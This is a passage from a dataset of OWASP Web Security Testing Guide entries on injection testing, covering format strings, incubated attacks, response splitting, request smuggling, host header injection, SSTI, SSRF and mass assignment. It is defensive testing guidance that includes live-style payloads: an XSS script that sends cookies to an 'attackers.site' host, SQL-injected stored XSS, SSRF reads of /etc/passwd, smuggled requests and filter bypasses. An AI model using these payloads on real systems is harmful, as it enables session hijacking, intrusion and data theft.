- title: WSTG-INPV-13 Testing for Format String Injection
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-13 — Testing for Format String Injection

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-13) — CC BY-SA 4.0

    A format string is a null-terminated character sequence that also contains conversion specifiers interpreted or converted at runtime. If server-side code [concatenates a user's input with a format string](https://www.netsparker.com/blog/web-security/string-concatenation-format-string-vulnerabilities/), an attacker can append additional conversion specifiers to cause a runtime error, information disclosure, or buffer overflow.

    ### Test Objectives

    - Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.

    ### How to Test

    Tests include analysis of the code and injecting conversion specifiers as user input to the application under test.

    ### Static Analysis

    Static analysis tools can find format string vulnerabilities in either the code or in binaries. Examples of tools include:

    - C and C++: [Flawfinder](https://dwheeler.com/flawfinder/)
    - Java: FindSecurityBugs rule [FORMAT_STRING_MANIPULATION](https://find-sec-bugs.github.io/bugs.htm#FORMAT_STRING_MANIPULATION)
    - PHP: String formatter Analyzer in [phpsa](https://github.com/ovr/phpsa/blob/master/docs/05_Analyzers.md#function_string_formater)

    ### Manual Code Inspection

    Static analysis may miss more subtle cases including format strings generated by complex code. To look for vulnerabilities manually in a codebase, a tester can look for all calls in the codebase that accept a format string and trace back to make sure untrusted input cannot change the format string.

    ### Conversion Specifier Injection

    Testers can check at the unit test or full system test level by sending conversion specifiers in any string input. [Fuzz](https://owasp.org/www-community/Fuzzing) the program using all of the conversion specifiers for all languages the system under test uses. See the [OWASP Format string attack](https://owasp.org/www-community/attacks/Format_string_attack) page for possible inputs to use. If the test fails, the program will crash or display an unexpected output. If the test passes, the attempt to send a conversion specifier should be blocked, or the string should go through the system with no issues as with any other valid input.

    The examples in the following subsections have a URL of this form:

    `https://vulnerable_host/userinfo?username=x`

    - The user-controlled value is `x` (for the `username` parameter).

    #### Manual Injection

    Testers can perform a manual test using a web browser or other web API debugging tools. Browse to the web application or site such that the query has conversion specifiers. Consider that most conversion specifiers need [encoding](https://tools.ietf.org/html/rfc3986#section-2.1) if sent inside a URL because they contain special characters including `%` and `{`. The test can introduce a string of specifiers `%s%s%s%n` by browsing with the following URL:

    `https://vulnerable_host/userinfo?username=%25s%25s%25s%25n`

    If the web site is vulnerable, the browser or tool should receive an error, which may include a timeout or an HTTP return code 500.

    The Java code returns the error

    `java.util.MissingFormatArgumentException: Format specifier '%s'`

    Depending on the C implementation, the process may crash completely with `Segmentation Fault`.

    #### Tool Assisted Fuzzing

    Fuzzing tools including [wfuzz](https://github.com/xmendez/wfuzz) can automate injection tests. For wfuzz, start with a text file (fuzz.txt in this example) with one input per line:

    fuzz.txt:

    ```text
    alice
    %s%s%s%n
    %p%p%p%p%p
    {event.__init__.__globals__[CONFIG][SECRET_KEY]}
    ```

    The `fuzz.txt` file contains the following:

    - A valid input `alice` to verify the application can process a normal input
    - Two strings with C-like conversion specifiers
    - One Python conversion specifier to attempt to read global variables

    To send the fuzzing input file to the web application under test, use the following command:

    `wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ`

    In the above call, the `urlencode` argument enables the appropriate escaping for the strings and `FUZZ` (with the capital letters) tells the tool where to introduce the inputs.

    An example output is as follows

    ```text
    ID           Response   Lines    Word     Chars       Payload
    ===================================================================

    000000002:   500        0 L      5 W      142 Ch      "%25s%25s%25s%25n"
    000000003:   500        0 L      5 W      137 Ch      "%25p%25p%25p%25p%25p"
    000000004:   200        0 L      1 W      48 Ch       "%7Bevent.__init__.__globals__%5BCONFIG%5D%5BSECRET_KEY%5D%7D"
    000000001:   200        0 L      1 W      5 Ch        "alice"
    ```

    The above result validates the application's weakness to the injection of C-like conversion specifiers `%s` and `%p`.
- title: WSTG-INPV-14 Testing for Incubated Vulnerability
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-14 — Testing for Incubated Vulnerability

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-14) — CC BY-SA 4.0

    Also often referred to as persistent attacks, incubated testing is a complex testing method that needs more than one data validation vulnerability to work. Incubated vulnerabilities are typically used to conduct "watering hole" attacks against users of legitimate web applications.

    ### Test Objectives

    - Identify injections that are stored and require a recall step to the stored injection.
    - Understand how a recall step could occur.
    - Set listeners or activate the recall step if possible.

    ### How to Test

    ### Black-Box Testing

    #### File Upload Example

    Verify the content type allowed to upload to the web application and the resultant URL for the uploaded file. Upload a file that will exploit a component in the local user workstation when viewed or downloaded by the user. Send your victim an email or other kind of alert in order to lead him/her to browse the page. The expected result is the exploit will be triggered when the user browses the resultant page or downloads and executes the file from the trusted site.

    #### XSS Example on a Bulletin Board

    1. Introduce JavaScript code as the value for the vulnerable field, for instance `<script>document.write('<img src="https://attackers.site/cv.jpg?'+document.cookie+'">')</script>`
    2. Direct users to browse the vulnerable page or wait for the users to browse it. Have a "listener" at `attackers.site` host listening for all incoming connections.
    3. When users browse the vulnerable page, a request containing their cookie (`document.cookie` is included as part of the requested URL) will be sent to the `attackers.site` host, such as: `GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1`
    4. Use cookies obtained to impersonate users at the vulnerable site.

    #### SQL Injection Example

    Usually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability. The first thing to test is whether the target site has a SQL injection vulnerability. This is described in [Testing for SQL Injection](05-Testing_for_SQL_Injection.md). For each SQL-injection vulnerability, there is an underlying set of constraints describing the kind of queries that the attacker/pentester is allowed to do.

    The tester then has to match the XSS attacks he has devised with the entries that he is allowed to insert.

    In a similar fashion as in the previous XSS example, use a web page field vulnerable to SQL injection issues to change a value in the database that would be used by the application as input to be shown at the site without proper filtering (this would be a combination of an SQL injection and a XSS issue). For instance, let's suppose there is a `footer` table at the database with all footers for the site pages, including a `notice` field with the legal notice that appears at the bottom of each web page. You could use the following query to inject JavaScript code to the `notice` field at the `footer` table in the database.

    ```sql
    SELECT field1, field2, field3
    FROM table_x
    WHERE field2 = 'x';
       UPDATE footer
       SET notice = 'Copyright 1999-2030%20
           <script>document.write(\'<img src="https://attackers.site/cv.jpg?\'+document.cookie+\'">\')</script>'
       WHERE notice = 'Copyright 1999-2030';
    ```

    Now, each user browsing the site will silently send their cookies to the `attackers.site`.

    #### Misconfigured Server

    Some web servers present an administration interface that may allow an attacker to upload active components of her choice to the site. This could be the case with an Apache Tomcat server that doesn’t enforce strong credentials to access its Web Application Manager (or if the pentesters have been able to obtain valid credentials for the administration module by other means).

    In this case, a WAR file can be uploaded and a new web application deployed at the site, which will not only allow the pentester to execute code of her choice locally at the server, but also to plant an application at the trusted site, which the site regular users can then access (most probably with a higher degree of trust than when accessing a different site).

    As should also be obvious, the ability to change web page contents at the server, via any vulnerabilities that may be exploitable at the host which will give the attacker webroot write permissions, will also be useful towards planting such an incubated attack on the web server pages (actually, this is a known infection-spread method for some web server worms).

    ### Gray-Box Testing

    Gray-box or white-box testing techniques will be the same as previously discussed.

    - Examining input validation is key in mitigating against this vulnerability. If other systems in the enterprise use the same persistence layer they may have weak input validation and the data may be persisted via a `backdoor`.
    - To combat the `backdoor` issue for client-side attacks, output validation must also be employed so tainted data shall be encoded prior to displaying to the client, and hence not execute.
- title: WSTG-INPV-15 Testing for HTTP Response Splitting
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-15 — Testing for HTTP Response Splitting

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-15) — CC BY-SA 4.0

    HTTP Response Splitting is a vulnerability that occurs when an application incorporates unsanitized user input into HTTP response headers, allowing an attacker to inject Carriage Return (CR) and Line Feed (LF) characters. As a result, a single HTTP response can be interpreted as multiple distinct responses by clients or intermediary systems.

    ### Test Objectives

    - Identify user-controlled input that is reflected into HTTP response headers.
    - Assess whether CR (`\r`) and LF (`\n`) characters can be injected into response headers.
    - Determine the potential impact of successful HTTP Response Splitting attacks, such as cache poisoning or client-side exploitation.

    ### How to Test

    ### Black-Box Testing

    Some web applications use user-supplied input to generate the values of certain HTTP response headers. A common example is redirection logic, where the destination URL is derived from a request parameter.

    For instance, assume a user is asked to choose between a standard or advanced interface. The selected option is passed as a parameter and reflected in a redirection response header.

    If the parameter `interface` has the value `advanced`, the application may respond with:

    ```http
    HTTP/1.1 302 Moved Temporarily
    Date: Sun, 03 Dec 2005 16:22:19 GMT
    Location: https://victim.com/main.jsp?interface=advanced
    ```

    When the browser receives this response, it follows the URL specified in the `Location` header. However, if the application does not properly validate or sanitize user input, an attacker may inject the sequence `%0d%0a`, representing CRLF characters used to separate HTTP header lines.

    By injecting CRLF sequences, a tester may cause the response to be interpreted as two separate HTTP responses by downstream clients or intermediary systems, such as web caches. This behavior can be exploited to poison caches or deliver malicious content to users.

    For example, the tester supplies the following value for the `interface` parameter:

    `advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>`

    The resulting response from the vulnerable application may be:

    ```http
    HTTP/1.1 302 Moved Temporarily
    Date: Sun, 03 Dec 2005 16:22:19 GMT
    Location: https://victim.com/main.jsp?interface=advanced
    Content-Length: 0

    HTTP/1.1 200 OK
    Content-Type: text/html
    Content-Length: 35

    <html>Sorry,%20System%20Down</html>
    ```

    A web cache processing this response may interpret it as two distinct responses. If the attacker immediately issues a subsequent request for `/index.html`, the cache may associate that request with the second response and store it. As a result, all subsequent users accessing `victim.com/index.html` through that cache may receive the attacker-controlled content.

    Alternatively, the attacker may inject a JavaScript payload to perform a cross-site scripting attack against users served by the poisoned cache. Although the vulnerability resides in the application, the primary targets are its users.

    To identify this issue, testers should locate all user-controlled input that influences HTTP response headers and verify whether CRLF sequences can be injected.

    The response headers most commonly associated with HTTP Response Splitting include:

    - `Location`
    - `Set-Cookie`

    Successful exploitation in real-world scenarios may require careful consideration of additional factors:

    - The tester may need to craft response headers suitable for caching (e.g., `Last-Modified` set to a future date) and potentially invalidate existing cache entries using headers such as `Pragma: no-cache`.
    - Applications may filter CRLF characters but allow alternative encodings or character representations, which can sometimes be leveraged to bypass input validation.
    - Some platforms URL-encode portions of response headers (such as the path in the `Location` header) while leaving the query string unencoded, allowing injection through specific components of the URL.

    For a deeper discussion of this attack class and additional exploitation scenarios, refer to the whitepapers listed in the References section.

    ### Gray-Box Testing

    In a gray-box testing scenario, knowledge of application architecture and server behavior improves exploitation reliability.

    Different servers or intermediaries may determine message boundaries differently (e.g., using fixed-size buffers), requiring precise offsets or padding. When vulnerable parameters are transmitted via GET, URL length limits may truncate payloads. Testers should identify alternative injection points or request methods, such as POST, to gain better control over payload length and positioning.
- title: WSTG-INPV-16 Testing for HTTP Request Smuggling
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-16 — Testing for HTTP Request Smuggling

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-16) — CC BY-SA 4.0

    HTTP Request Smuggling is a class of vulnerabilities caused by inconsistencies in how HTTP requests are parsed by frontend and backend components. When intermediaries such as reverse proxies, load balancers, or API gateways interpret request boundaries differently from backend servers, attackers may inject or "smuggle" hidden requests that are processed out of sequence.

    ### Test Objectives

    - Identify request boundary inconsistencies between frontend and backend components
    - Detect classic CL/TE desynchronization vulnerabilities
    - Evaluate protocol translation logic (HTTP/2 → HTTP/1.1)
    - Assess H2C upgrade handling and downgrade safety
    - Confirm backend request queue poisoning

    ### How to Test

    ### Black-Box Testing

    #### Testing for CL.TE Desynchronization

    In a CL.TE scenario, the frontend uses `Content-Length` to determine request size, while the backend honors `Transfer-Encoding`.

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 35
    Transfer-Encoding: chunked

    0

    GET /404 HTTP/1.1
    Foo: x
    ```

    Expected Result:

    - Backend stops parsing at the `0` chunk
    - Smuggled request remains buffered
    - Subsequent legitimate requests are corrupted or return unexpected responses (e.g., 404)

    #### Testing for TE.CL Desynchronization

    In a TE.CL scenario, the frontend processes chunked encoding correctly, but the backend relies on `Content-Length`.

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 4
    Transfer-Encoding: chunked

    5c
    GET /admin HTTP/1.1
    Content-Length: 0

    0
    ```

    Expected Result:

    - Backend stops early
    - Remaining payload is interpreted as a new request
    - Unauthorized endpoint access or request poisoning may occur

    #### Testing for TE.TE (Obfuscated Transfer-Encoding)

    If both servers support `Transfer-Encoding`, header obfuscation may cause one parser to ignore it.

    Common techniques include:

    - Whitespace manipulation
    - Header duplication
    - Non-standard separators

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 44
    Transfer-Encoding:\tchunked
    Transfer-Encoding: identity

    0

    GET /404 HTTP/1.1
    Foo: bar
    ```

    ### Modern Attack Vectors

    #### HTTP/2 to HTTP/1.1 Desynchronization

    In many deployments, clients communicate with edge servers using HTTP/2, while backend services still operate over HTTP/1.1. During protocol translation, intermediaries must reconstruct HTTP/1.1 requests from HTTP/2 frames.

    Common failure points include:

    - Incorrect reconstruction of `Content-Length`
    - Reintroduction of hop-by-hop headers
    - Multiple logical requests collapsed into a single backend request

    > Note: HTTP/2 downgrading is not inherently vulnerable by itself.  
    > Exploitation becomes possible when protocol translation reconstructs an HTTP/1.1 request that violates backend parsing assumptions, leading to request boundary desynchronization.

    Testing Approach:

    - Send multiple HTTP/2 DATA frames with conflicting length semantics
    - Observe backend behavior via timing discrepancies or response splitting
    - Monitor for request queue poisoning

    ##### Example: HTTP/2 Downgrade Smuggling via Request Reconstruction

    In this scenario, the client communicates with the frontend over HTTP/2, while the backend only supports HTTP/1.1. The intermediary reconstructs an HTTP/1.1 request from multiple HTTP/2 DATA frames.

    **HTTP/2 (Conceptual Representation):**

    - DATA frame 1:

    ```http
    0\r\n\r\n
    ```

    - DATA frame 2:

    ```http
    GET /admin HTTP/1.1
    Host: internal
    ```

    **Reconstructed HTTP/1.1 Request (Backend View):**

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 0

    GET /admin HTTP/1.1
    Host: internal
    ```

    If the frontend treats the request as complete while the backend continues parsing buffered data, the second request may be processed out of sequence, resulting in request smuggling.

    > Implicit Downgrades:
    > Even in the absence of an explicit `Upgrade: h2c` mechanism, many CDNs and reverse proxies silently downgrade HTTP/2 client connections to HTTP/1.1 when forwarding requests to backend services.  
    > These implicit downgrades expand the smuggling attack surface, especially when combined with connection reuse and insufficient request normalization.

    #### H2C Smuggling (Cleartext HTTP/2 Upgrade)

    H2C allows upgrading an HTTP/1.1 connection to HTTP/2 using the `Upgrade: h2c` mechanism.  
    Unlike protocol downgrades, H2C smuggling occurs during an in-place protocol transition, where frontend and backend components may temporarily disagree on the active parsing state of the same connection, potentially leaving residual bytes in the backend buffer.

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Connection: Upgrade, HTTP2-Settings
    Upgrade: h2c
    HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

    0

    GET /admin HTTP/1.1
    Host: internal
    ```

    Risk Factors:

    - Partial upgrade acceptance
    - Backend continues parsing as HTTP/1.1
    - Smuggled request processed post-upgrade

    #### Request Queue Poisoning via Protocol Downgrade

    Some proxies downgrade HTTP/2 requests to HTTP/1.1 but fail to fully sanitize:

    - `Content-Length`
    - Duplicated headers
    - Invalid pseudo-header ordering

    Attackers can exploit this to poison persistent backend connections, impacting multiple users.

    ### Indicators of Vulnerability

    - Inconsistent responses across identical requests
    - Unexpected 404 or 400 responses
    - Delayed or mismatched responses
    - Cross-user response leakage
- title: WSTG-INPV-17 Testing for Host Header Injection
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-17 — Testing for Host Header Injection

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-17) — CC BY-SA 4.0

    A web server commonly hosts several web applications on the same IP address, referring to each application via the virtual host. In an incoming HTTP request, web servers often dispatch the request to the target virtual host based on the value supplied in the Host header. Without proper validation of the header value, the attacker can supply invalid input to cause the web server to:

    ### Test Objectives

    - Assess if the Host header is being parsed dynamically in the application.
    - Bypass security controls that rely on the header.

    ### How to Test

    Initial testing is as simple as supplying another domain (i.e. `attacker.com`) into the Host header field. It is how the web server processes the header value that dictates the impact. The attack is valid when the web server processes the input to send the request to an attacker-controlled host that resides at the supplied domain, and not to an internal virtual host that resides on the web server.

    ```http
    GET / HTTP/1.1
    Host: www.attacker.com
    [...]
    ```

    In the simplest case, this may cause a 302 redirect to the supplied domain.

    ```http
    HTTP/1.1 302 Found
    [...]
    Location: https://www.attacker.com/login.php

    ```

    Alternatively, the web server may send the request to the first virtual host on the list.

    ### X-Forwarded Host Header Bypass

    In the event that Host header injection is mitigated by checking for invalid input injected via the Host header, you can supply the value to the `X-Forwarded-Host` header.

    ```http
    GET / HTTP/1.1
    Host: www.example.com
    X-Forwarded-Host: www.attacker.com
    [...]
    ```

    Potentially producing client-side output such as:

    ```html
    [...]
    <link src="https://www.attacker.com/link" />
    [...]
    ```

    Once again, this depends on how the web server processes the header value.

    ### Web Cache Poisoning

    Using this technique, an attacker can manipulate a web-cache to serve poisoned content to anyone who requests it. This relies on the ability to poison the caching proxy run by the application itself, CDNs, or other downstream providers. As a result, the victim will have no control over receiving the malicious content when requesting the vulnerable application.

    ```http
    GET / HTTP/1.1
    Host: www.attacker.com
    [...]
    ```

    The following will be served from the web cache, when a victim visits the vulnerable application.

    ```html
    [...]
    <link src="https://www.attacker.com/link" />
    [...]
    ```

    ### Password Reset Poisoning

    It is common for password reset functionality to include the Host header value when creating password reset links that use a generated secret token. If the application processes an attacker-controlled domain to create a password reset link, the victim may click on the link in the email and allow the attacker to obtain the reset token, thus resetting the victim's password.

    The example below shows a password reset link that is generated in PHP using the value of `$_SERVER['HTTP_HOST']`, which is set based on the contents of the HTTP Host header:

    ```php
    $reset_url = "https://" . $_SERVER['HTTP_HOST'] . "/reset.php?token=" .$token;
    send_reset_email($email,$rset_url);
    ```

    By making a HTTP request to the password reset page with a tampered Host header, we can modify where the URL points:

    ```http
    POST /request_password_reset.php HTTP/1.1
    Host: www.attacker.com
    [...]

    email=user@example.org
    ```

    The specified domain (`www.attacker.com`) will then be used in the reset link, which is emailed to the user. When the user clicks this link, the attacker can steal the token and compromise their account.

    ```text
    ... Email snippet ...

    Click on the following link to reset your password:

    https://www.attacker.com/reset.php?token=12345

    ... Email snippet ...
    ```

    ### Accessing Private Virtual Hosts

    In some cases a server may have virtual hosts that are not intended to be externally accessible. This is most common with a [split-horizon](https://en.wikipedia.org/wiki/Split-horizon_DNS) DNS setup (where internal and external DNS servers return different records for the same domain).

    For example, an organization may have a single webserver on their internal network, which hosts both their public website (on `www.example.org`) and their internal Intranet (on `intranet.example.org`, but that record only exists on the internal DNS server). Although it would not be possible to browse directly to `intranet.example.org` from outside the network (as the domain would not resolve), it may be possible to access to Intranet by making a request from outside with the following `Host` header:

    ```http
    Host: intranet.example.org
    ```

    This could also be achieved by adding an entry for `intranet.example.org` to your hosts file with the public IP address of `www.example.org`, or by overriding DNS resolution in your testing tool.
- title: WSTG-INPV-18 Testing for Server-side Template Injection
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-18 — Testing for Server-side Template Injection

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-18) — CC BY-SA 4.0

    Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.

    ### Test Objectives

    - Detect template injection vulnerability points.
    - Identify the templating engine.
    - Build the exploit.

    ### How to Test

    SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform 'text' with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)

    ### Identify Template Injection Vulnerability

    The first step in testing SSTI in plaintext context is to construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.

    Common template expression examples:

    ```text
    a{{bar}}b
    a{{7*7}}
    {var} ${var} {{var}} <%var%> [% var %]
    ```

    In this step an extensive [template expression test strings/payloads list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) is recommended.

    Testing for SSTI in code context is slightly different. First, the tester constructs the request that result either blank or error server responses. In the example below the HTTP GET parameter is inserted info the variable `personal_greeting` in a template statement:

    ```text
    personal_greeting=username
    Hello user01
    ```

    Using the following payload - the server response is blank "Hello":

    ```text
    personal_greeting=username<tag>
    Hello
    ```

    In the next step is to break out of the template statement and injecting HTML tag after it using the following payload

    ```text
    personal_greeting=username}}<tag>
    Hello user01 <tag>
    ```

    ### Identify the Templating Engine

    Based on the information from the previous step now the tester has to identify which template engine is used by supplying various template expressions. Based on the server responses the tester deduces the template engine used. This manual approach is discussed in greater detail in [this](https://portswigger.net/blog/server-side-template-injection?#Identify) PortSwigger article. To automate the identification of the SSTI vulnerability and the templating engine various tools are available including [Tplmap](https://github.com/epinna/tplmap) or the [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner).

    ### Build the RCE Exploit

    The main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template documentation and research. Key areas of interest are:

    - **For template authors** sections covering basic syntax.
    - **Security considerations** sections.
    - Lists of built-in methods, functions, filters, and variables.
    - Lists of extensions/plugins.

    The tester can also identify what other objects, methods and properties can be exposed by focusing on the `self` object. If the `self` object is not available and the documentation does not reveal the technical details, a brute force of the variable name is recommended. Once the object is identified the next step is to loop through the object to identify all the methods, properties and attributes that are accessible through the template engine. This could lead to other kinds of security findings including privilege escalations, information disclosure about application passwords, API keys, configurations and environment variables, etc.
- title: WSTG-INPV-19 Testing for Server-Side Request Forgery
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-19 — Testing for Server-Side Request Forgery

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-19) — CC BY-SA 4.0

    Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).

    ### Test Objectives

    - Identify SSRF injection points.
    - Test if the injection points are exploitable.
    - Asses the severity of the vulnerability.

    ### How to Test

    When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.

    Consider the following request:

    ``` http
    GET https://example.com/page?page=about.php
    ```

    You can test this request with the following payloads.

    ### Load the Contents of a File

    ```http
    GET https://example.com/page?page=https://malicioussite.com/shell.php
    ```

    ### Access a Restricted Page

    ```http
    GET https://example.com/page?page=http://localhost/admin
    ```

    Or:

    ```http
    GET https://example.com/page?page=http://127.0.0.1/admin
    ```

    Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.

    These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.

    ### Fetch a Local File

    ```http
    GET https://example.com/page?page=file:///etc/passwd
    ```

    ### HTTP Methods Used

    All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.

    One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.

    You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](#references).

    ### PDF Generators

    In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.

    ```html
    <iframe src="file:///etc/passwd" width="400" height="400">
    <iframe src="file:///c:/windows/win.ini" width="400" height="400">
    ```

    ### Common Filter Bypass

    Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:

    - Using alternative IP representation that evaluate to `127.0.0.1`:
        - Decimal notation: `2130706433`
        - Octal notation: `017700000001`
        - IP shortening: `127.1`
        - Alternative IPs treated as loopback: `127.0.0.2`
    - String obfuscation
    - Creating a public DNS on a domain you own that resolves to `127.0.0.1`

    Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).

    - Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`
    - URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
    - URL encoding
    - Fuzzing
    - Combinations of all of the above

    For additional payloads and bypass techniques, see the [references](#references) section.
- title: WSTG-INPV-20 Testing for Mass Assignment
  service: http
  tech: injection
  doc_kind: wstg
  content: |-
    ## WSTG-INPV-20 — Testing for Mass Assignment

    Category: 07-Input_Validation_Testing  
    Source: OWASP WSTG (WSTG-INPV-20) — CC BY-SA 4.0

    Modern web applications are very often based on frameworks. Many of these web application frameworks allow automatic binding of user input (in the form of HTTP request parameters) to internal objects. This is often called autobinding.
    This feature can be sometimes exploited to access fields that were never intended to be modified from outside leading to privilege escalation, data tampering, bypass of security mechanisms, and more.
    In this case there is a Mass Assignment vulnerability.

    ### Test Objectives

    - Identify requests that modify objects
    - Assess if it is possible to modify fields never intended to be modified from outside

    ### How to Test

    The following is a classic example that can help to illustrate the issue.

    Suppose a Java web application with a `User` object similar to the following:

    ```java
    public class User {
       private String username;
       private String password;
       private String email;
       private boolean isAdmin;

       //Getters & Setters
    }
    ```

    To create a new `User` the web application implements the following view:

    ```html
    <form action="/createUser" method="POST">
         <input name="username" type="text">
         <input name="password" type="text">
         <input name="email" text="text">
         <input type="submit" value="Create">
    </form>
    ```

    The controller that handles the creation request (Spring provides the automatic bind with the `User` model):

    ```java
    @RequestMapping(value = "/createUser", method = RequestMethod.POST)
    public String createUser(User user) {
       userService.add(user);
       return "successPage";
    }
    ```

    When the form is submitted, the following request is generated by the browser:

    ```http
    POST /createUser
    [...]
    username=bob&password=supersecretpassword&email=bob@domain.test
    ```

    However, due to the autobinding, an attacker can add the `isAdmin` parameter to the request, which the controller will automatically bind to the model.

    ```http
    POST /createUser
    [...]
    username=bob&password=supersecretpassword&email=bob@domain.test&isAdmin=true
    ```

    The user is then created with the `isAdmin` property set to `true`, giving them administrative rights on the application.

    ### Black-Box Testing

    #### Detect Handlers

    In order to determine which part of the application is vulnerable to mass assignment, enumerate all parts of the application that accept content from the user and can potentially be mapped with a model. This includes all HTTP requests (most likely GET, POST, and PUT) that appear to allow create or update operations on the back end.
    One of the most simple indicators for potential mass assignments is the presence of bracket syntax for input parameter names, as for example:

    ```html
    <input name="user[name]" type="text">
    ```

    When such patterns are encountered try to add an input related to a non-exiting attribute (e.g. `user[nonexistingattribute]`) and analyze the response/behavior.
    If the application does not implement any control (e.g. list of allowed fields) it is likely that it will respond with an error (e.g. 500) due to the fact that the application does not find the attribute associated to the object. More interestingly, those errors sometimes facilitate discovery of attribute names and value data types needed to exploit the issue, without access to the source code.

    #### Identify Sensitive Fields

    Since in black-box testing the tester does not have visibility on the source code, it is necessary to find other ways in order to gather information about the attributes associated to the objects.
    Analyze the responses received by the back end, in particular pay attention to:

    - HTML page source code
    - Custom JavaScript code
    - API responses

    For example, very often, it is possible to exploit handlers that return details about an object in order to gather clues on the associated fields.
    Suppose for example a handler that returns the profile of the user (e.g. `GET /profile`), this may include further attributes related to the user (in this example the `isAdmin` attribute looks particularly interesting).

    ```json
    {"_id":12345,"username":"bob","age":38,"email":"bob@domain.test","isAdmin":false}
    ```

    Then try to exploit handlers that allow the modification or creation of users, adding the `isAdmin` attribute configured to `true`.

    Another approach is to use wordlists in order to try to enumerate all the potential attributes. The enumeration can then be automated (e.g. via wfuzz, Burp Intruder, ZAP fuzzer, etc.). The sqlmap tool includes a [common-columns.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-columns.txt) wordlist that can be useful to identify potential sensitive attributes.
    A small example of common interesting attribute names are the following:

    - `is_admin`
    - `is_administrator`
    - `isAdmin`
    - `isAdministrator`
    - `admin`
    - `administrator`
    - `role`

    When multiple roles are available try to compare requests made by different user levels (pay particular attention to privileged roles). For example, if extra parameters are included in requests made by an administrative user, try those as a low privileged/anonymous user.

    #### Check Impact

    The impact of a mass assignment can vary depending on the context therefore, for each test input attempted in the previous phase, analyze the result and determine if it represents a vulnerability that has a realistic impact on the web application's security.
    For example, the modification of the `id` of an object can lead to application Denial of Service or privilege escalation. Another example is related to the possibility to modify the role/status of the user (e.g. `role` or `isAdmin`) leading to vertical privilege escalation.

    ### Gray-Box Testing

    When the analysis is performed with a gray-box testing approach, it is possible to follow the same methodology to verify the issue. However, the greater knowledge on the application allows to more easily identify frameworks and handlers subject to mass assignment vulnerability.
    In particular, when the source code is available, it is possible to search the input vectors more easily and accurately. During a source code review, use simple tools (such as the grep command) to search for one or more common patterns within the application code.
    Access to the DB schema or to the source code allows also to easily identify sensitive fields.

    #### Java

